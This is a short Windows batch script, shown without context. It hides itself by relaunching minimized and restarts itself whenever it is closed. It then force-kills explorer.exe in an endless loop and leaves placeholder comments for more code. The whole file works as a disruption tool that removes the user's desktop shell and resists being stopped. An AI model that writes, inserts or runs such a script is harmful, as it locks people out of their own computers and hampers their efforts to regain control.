@echo off
if "%1" equ "Restarted" goto :start

:again
if not defined IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
goto :again

:start
title
tasklist /nh /fi "imagename eq explorer.exe" | find /i "explorer.exe" >nul && (
taskkill -im explorer.exe /f > nul
) || (
goto :mainscript
)

:Restarted
::<code here that runs when restarted>
goto :start

:mainscript
::<code here that runs when it wasn't able to kill explorer.exe (it didn't exist)>
goto :start